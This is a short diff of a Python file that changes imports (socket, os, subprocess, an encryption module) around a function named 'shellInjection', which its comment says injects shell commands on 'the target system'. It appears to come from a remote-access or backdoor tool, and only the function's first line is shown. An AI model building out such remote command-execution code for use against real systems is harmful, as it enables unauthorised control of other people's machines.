@@ -1,9 +1,10 @@
 import socket
-from GLOBAL import *
 import os
 import subprocess
-from _crypto import _crypto as Crypto 
+from ENCRYPTION import *
 from time import sleep
+
+
 #Injects a shell commands on the target system
 def shellInjection(command):
     shellc = command.split()
